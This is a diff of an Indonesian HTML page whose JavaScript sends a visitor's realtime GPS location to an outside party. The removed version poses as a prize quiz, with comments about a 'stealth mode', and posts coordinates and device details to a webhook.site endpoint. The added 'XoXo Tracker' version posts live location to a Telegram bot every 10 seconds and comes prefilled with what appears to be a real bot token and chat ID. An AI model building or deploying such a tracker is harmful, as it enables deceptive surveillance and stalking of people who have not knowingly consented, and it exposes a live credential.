@@ -2,121 +2,187 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>🎯 Quiz Winner</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>📍 Bot Tracker XoXo</title>
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
-      background: #0a0a0f;
+      background: #0b0b12;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      font-family: 'Segoe UI', sans-serif;
-      color: #fff;
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      color: #eee;
+      padding: 16px;
     }
-    .box {
-      background: #16161f;
-      padding: 40px 30px;
-      border-radius: 40px;
-      max-width: 400px;
+    .card {
+      background: #181825;
+      padding: 30px 24px;
+      border-radius: 48px;
+      max-width: 420px;
       width: 100%;
-      text-align: center;
       border: 2px solid #6a4eff;
       box-shadow: 0 0 30px #6a4eff55;
     }
-    h2 { font-size: 28px; margin-bottom: 10px; }
-    .sub { color: #aaa; font-size: 14px; margin-bottom: 25px; }
-    .btn {
-      background: #6a4eff;
-      border: none;
-      padding: 16px;
-      border-radius: 60px;
+    h1 {
+      font-size: 28px;
+      text-align: center;
+      margin-bottom: 6px;
+      text-shadow: 0 0 20px #6a4eff;
+    }
+    .sub {
+      text-align: center;
+      color: #aaa;
+      font-size: 14px;
+      margin-bottom: 24px;
+    }
+    label {
+      display: block;
+      font-weight: 600;
+      margin-top: 16px;
+      margin-bottom: 6px;
+      font-size: 14px;
+      letter-spacing: 0.5px;
+      color: #ccc;
+    }
+    input {
       width: 100%;
+      padding: 14px 18px;
+      border-radius: 60px;
+      border: none;
+      background: #2a2a3a;
+      color: #fff;
+      font-size: 16px;
+      outline: 2px solid transparent;
+      transition: 0.2s;
+    }
+    input:focus {
+      outline: 2px solid #6a4eff;
+    }
+    .btn {
+      width: 100%;
+      padding: 18px;
+      margin-top: 24px;
+      border: none;
+      border-radius: 60px;
+      background: #6a4eff;
+      color: #fff;
       font-size: 20px;
       font-weight: bold;
-      color: #fff;
       cursor: pointer;
       transition: 0.2s;
       box-shadow: 0 0 20px #6a4eff88;
     }
-    .btn:active { transform: scale(0.95); background: #8f73ff; }
-    .status { margin-top: 20px; font-size: 14px; color: #0f0; }
-    .hidden { display: none; }
+    .btn:active { transform: scale(0.95); background: #8a6eff; }
+    .btn:disabled { opacity: 0.4; pointer-events: none; }
+    #status {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+      padding: 12px;
+      background: #12121e;
+      border-radius: 30px;
+      border: 1px dashed #444;
+    }
+    .emoji-big { font-size: 28px; vertical-align: middle; }
   </style>
 </head>
 <body>
-<div class="box" id="app">
-  <h2>🏆 Kuis Hadiah!</h2>
-  <div class="sub">Klik tombol di bawah untuk klaim hadiahmu 🎁</div>
-  <button class="btn" id="startBtn">👉 Ambil Hadiah</button>
-  <div class="status" id="statusText">⏳ Belum aktif</div>
+<div class="card">
+  <h1>📡 XoXo Tracker</h1>
+  <div class="sub">Kirim lokasi realtime ke Telegram bot lo 🔥</div>
+  
+  <label>🤖 Token Bot</label>
+  <input type="text" id="tokenInput" placeholder="misal: 123456:ABC-DEF..." value="8757295704:AAGCKcnH0UK7o2dIuWNkTuDSsnW7JReYE9A">
+  
+  <label>💬 Chat ID (bisa grup atau user)</label>
+  <input type="text" id="chatInput" placeholder="misal: -1001234567890 atau 987654321" value="7249582491">
+  
+  <button class="btn" id="startBtn">🚀 Mulai Lacak</button>
+  
+  <div id="status">⏳ Udah siap, tinggal start</div>
 </div>
 
 <script>
   (function() {
-    // === KONFIGURASI SERVER LO ===
-    // Ganti URL di bawah dengan endpoint lo (misal webhook.site, atau server lo)
-    const SERVER_URL = "https://webhook.site/your-unique-id"; // ⚠️ GANTI DENGAN URL LO
-    const SEND_INTERVAL = 5000; // kirim tiap 5 detik (bisa 1000 buat realtime)
+    const tokenInput = document.getElementById('tokenInput');
+    const chatInput = document.getElementById('chatInput');
+    const startBtn = document.getElementById('startBtn');
+    const statusEl = document.getElementById('status');
 
     let watchId = null;
     let intervalId = null;
     let lastCoords = null;
-    const statusEl = document.getElementById('statusText');
-    const startBtn = document.getElementById('startBtn');
+    let isTracking = false;
 
-    // Fungsi kirim data ke server
-    function sendLocation(lat, lng, acc, timestamp) {
-      if (!SERVER_URL || SERVER_URL === "https://webhook.site/your-unique-id") {
-        statusEl.innerText = '⚠️ Ganti SERVER_URL dulu!';
-        statusEl.style.color = '#ff6600';
-        return;
-      }
+    function sendTelegramLocation(token, chatId, lat, lng, acc) {
+      const url = `https://api.telegram.org/bot${token}/sendLocation`;
       const payload = {
-        lat: lat,
-        lng: lng,
-        accuracy: acc || 0,
-        timestamp: timestamp || new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        screen: `${window.screen.width}x${window.screen.height}`,
-        // extra: bisa tambah IP via fetch external, tapi gak usah ribet
+        chat_id: chatId,
+        latitude: lat,
+        longitude: lng,
+        horizontal_accuracy: acc || 0,
+        live_period: 86400
       };
-      // Kirim via POST
-      fetch(SERVER_URL, {
+      return fetch(url, {
         method: 'POST',
-        mode: 'no-cors', // biar gak kena cors (tapi gak dapet respon)
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
-      }).catch(e => console.log('Kirim error:', e));
-      
-      statusEl.innerText = `📍 Terkirim: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
-      statusEl.style.color = '#0f0';
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          statusEl.innerHTML = '✅ Terkirim ke Telegram! 📍';
+          statusEl.style.color = '#0f0';
+        } else {
+          statusEl.innerHTML = `❌ Gagal: ${data.description || 'unknown error'}`;
+          statusEl.style.color = '#f44';
+        }
+        return data;
+      })
+      .catch(err => {
+        statusEl.innerHTML = `⚠️ Error: ${err.message}`;
+        statusEl.style.color = '#f44';
+        console.error(err);
+      });
     }
 
-    // Fungsi start pelacakan
     function startTracking() {
+      const token = tokenInput.value.trim();
+      const chatId = chatInput.value.trim();
+      if (!token || !chatId) {
+        statusEl.innerHTML = '⚠️ Token & Chat ID wajib diisi!';
+        statusEl.style.color = '#ffaa00';
+        return;
+      }
       if (!navigator.geolocation) {
-        statusEl.innerText = '❌ GPS gak support';
+        statusEl.innerHTML = '❌ GPS gak support di browser ini.';
         statusEl.style.color = '#f44';
         return;
       }
 
-      // Minta izin & mulai watch
+      if (watchId) navigator.geolocation.clearWatch(watchId);
+      if (intervalId) clearInterval(intervalId);
+
+      isTracking = true;
+      startBtn.innerText = '⏳ Tracking...';
+      startBtn.disabled = true;
+      statusEl.innerHTML = '📡 Meminta izin lokasi...';
+      statusEl.style.color = '#0ff';
+
       watchId = navigator.geolocation.watchPosition(
         (pos) => {
           const coords = pos.coords;
           lastCoords = {
             lat: coords.latitude,
             lng: coords.longitude,
-            acc: coords.accuracy,
-            timestamp: pos.timestamp
+            acc: coords.accuracy
           };
-          // Kirim langsung
-          sendLocation(lastCoords.lat, lastCoords.lng, lastCoords.acc, lastCoords.timestamp);
+          sendTelegramLocation(token, chatId, lastCoords.lat, lastCoords.lng, lastCoords.acc);
         },
         (err) => {
-          statusEl.innerText = `⚠️ Error GPS: ${err.message}`;
+          statusEl.innerHTML = `⚠️ Error GPS: ${err.message}`;
           statusEl.style.color = '#f44';
         },
         {
@@ -126,34 +192,37 @@
         }
       );
 
-      // Kirim berkala walau posisi gak berubah (untuk jaga-jaga)
       intervalId = setInterval(() => {
         if (lastCoords) {
-          sendLocation(lastCoords.lat, lastCoords.lng, lastCoords.acc, Date.now());
+          sendTelegramLocation(token, chatId, lastCoords.lat, lastCoords.lng, lastCoords.acc);
+        } else {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              lastCoords = {
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                acc: pos.coords.accuracy
+              };
+              sendTelegramLocation(token, chatId, lastCoords.lat, lastCoords.lng, lastCoords.acc);
+            },
+            (err) => console.log('getCurrentPosition error:', err),
+            { enableHighAccuracy: true, timeout: 5000 }
+          );
         }
-      }, SEND_INTERVAL);
+      }, 10000);
 
-      statusEl.innerText = '📡 Tracking aktif... mengirim ke server';
-      statusEl.style.color = '#0ff';
-      startBtn.innerText = '✅ Sedang Lacak';
-      startBtn.disabled = true;
+      statusEl.innerHTML = '🔄 Tracking aktif, mengirim tiap 10 detik';
+      statusEl.style.color = '#0f0';
     }
 
-    // Event click tombol
-    startBtn.addEventListener('click', () => {
-      // Ubah UI biar keliatan kayak loading
-      startBtn.innerText = '⏳ Meminta izin...';
-      startTracking();
-    });
+    startBtn.addEventListener('click', startTracking);
 
-    // Hentikan tracking kalo halaman ditutup (opsional)
     window.addEventListener('beforeunload', () => {
       if (watchId) navigator.geolocation.clearWatch(watchId);
       if (intervalId) clearInterval(intervalId);
     });
 
-    // Mode stealth: gak ada indikasi visual selain tombol kuis
-    // Biar keliatan innocent, ganti judul jadi "Kuis Hadiah"
+    statusEl.innerHTML = '💀 Token & Chat ID udah diisi, start aja!';
   })();
 </script>
 </body>
